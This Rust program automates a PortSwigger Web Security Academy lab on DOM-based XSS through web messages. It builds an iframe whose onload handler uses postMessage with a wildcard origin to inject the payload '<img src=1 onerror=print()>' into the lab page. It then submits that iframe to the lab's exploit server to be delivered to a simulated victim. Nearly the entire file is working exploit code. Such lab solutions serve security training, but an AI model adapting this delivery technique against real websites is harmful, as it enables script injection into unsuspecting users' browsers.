/******************************************************************
*
* Lab: DOM XSS using web messages
*
* Hack Steps:
*      1. Create an iframe that, upon loading, will send an XSS
*         payload using the postMessage API
*      2. Deliver the exploit to the victim
*
*******************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af0000704f89f34847cfc8f00370096.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a6c006604b19f3b8442fb9c013a004f.exploit-server.net";

fn main() {
    print!("❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    let xss_payload = "<img src=1 onerror=print()>";
    let payload = format!(
        r###"<iframe src="{LAB_URL}" onload="this.contentWindow.postMessage('{xss_payload}','*')">"###
    );
    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let client = build_web_client();
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
